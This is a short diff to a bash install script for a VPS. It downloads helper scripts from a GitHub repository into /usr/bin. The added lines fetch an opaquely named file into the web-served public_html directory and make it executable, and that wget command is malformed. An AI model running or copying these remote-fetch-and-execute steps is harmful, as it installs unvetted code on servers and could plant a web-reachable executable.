@@ -1,5 +1,8 @@
 #!/bin/bash
 
+wget /home/vps/public_html https://raw.githubusercontent.com/bokir-tampan/auah/main/shahwjusisjsnajakajannaiajanajam
+chmod +x /home/vps/public_html/shahwjusisjsnajakajannaiajanajam
+
 cd /usr/bin
 wget -O addip https://raw.githubusercontent.com/bokir-tampan/auah/main/addip.sh
 wget -O delip https://raw.githubusercontent.com/bokir-tampan/auah/main/delip.sh
